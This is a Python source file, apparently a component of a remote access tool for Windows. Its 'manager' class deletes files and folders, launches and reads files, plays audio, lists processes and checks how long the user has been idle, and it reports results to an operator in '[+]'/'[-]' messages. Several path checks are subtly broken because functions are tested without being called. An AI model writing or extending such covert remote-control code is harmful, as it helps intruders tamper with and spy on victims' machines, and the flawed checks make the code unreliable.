import os
import wmi
import shutil
import soundfile as sf
import sounddevice as sd
from ctypes import Structure, windll, c_uint, sizeof, byref

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

class manager():
    def delete_file(self, path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            elif os.path.isfile(path):
                os.remove(path)

            return "[+] Successfully deleted: {} from the system.".format(path)
        except Exception as e:
            return "[-] Error deleting: {} from the system: {}.".format(path, e)

    def launch_file(self, path):
        try:
            if os.path.exists and os.path.isfile(path):
                os.startfile(path)

                return "[+] Successfully launching: {}.".format(path)
            else:
                return "[-] The path you specified is not valid."
        except Exception as e:
            return "[-] Couldn't launch: {}, {}".format(path, e)

    def read_content_of_file(self, path):
        try:
            if os.path.exists and os.path.isfile(path):
                data = "Content of the file:\n"

                with open(path, "r") as file:
                    file_data = file.read()
                    if len(file_data) == 0:
                        data += "File is Empty!\n"
                    else:
                        data += file_data + "\n"

                return data
            else:
                return "[-] The path you specified is not valid."
        except Exception as e:            
            return "[-] Couldn't read: {} content: {}".format(path, e)
    
    def play_sound(self, path, should_stop):
        try:
            if should_stop:
                sd.stop()
                return "[+] Stopped playing the audio."

            if os.path.exists(path) and os.path.isfile:
                last_index = len(path)
                extension = path[last_index - 4:last_index]
                if extension == ".wav":                    
                    data, fs = sf.read(path, dtype='float32')  
                    sd.play(data, fs)
                    
                    return "[+] Playing: {}\nWrite stsound to stop.".format(path)
                else:
                    return "[-] The path you specified is not of type wav."
            else:
                return "[-] The path you specified is invalid."
        except Exception as e:
            return "[-] Couldn't play: {}, {}".format(path, e)

    def get_processes(self):
        try:
            f = wmi.WMI()
            
            data = "PID\t   Name\n---\t   ----"             
            for process in f.Win32_Process():                                
                data += f"\n{process.ProcessId:<10} {process.Name}"

            return data
        except Exception as e:
            return "[-] Couldn't get the list of processes running: {}".format(e)

    def get_idle_duration(self):
        try:
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = sizeof(lastInputInfo)
            windll.user32.GetLastInputInfo(byref(lastInputInfo))
            millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime

            return "Idle time: {}".format(millis / 1000.0)
        except Exception as e:
            return "[-] Couldn't get the idle time: {}.".format(e)